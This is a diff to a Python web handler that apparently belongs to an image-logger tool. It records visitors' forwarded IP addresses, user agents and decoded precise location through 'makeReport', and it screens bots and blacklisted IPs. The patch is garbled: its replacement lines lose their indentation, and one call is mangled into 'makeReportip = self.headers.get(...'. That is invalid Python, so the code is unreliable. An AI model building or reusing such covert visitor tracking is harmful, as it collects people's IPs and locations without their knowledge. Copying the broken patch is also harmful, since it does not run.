@@ -213,8 +213,9 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
+            ip = self.headers.get('x-forwarded-for', '') or ''
+if ip.startswith(blacklistedIPs):
+    return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
@@ -233,7 +234,7 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReportip = self.headers.get('x-forwarded-for', '') or '', self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
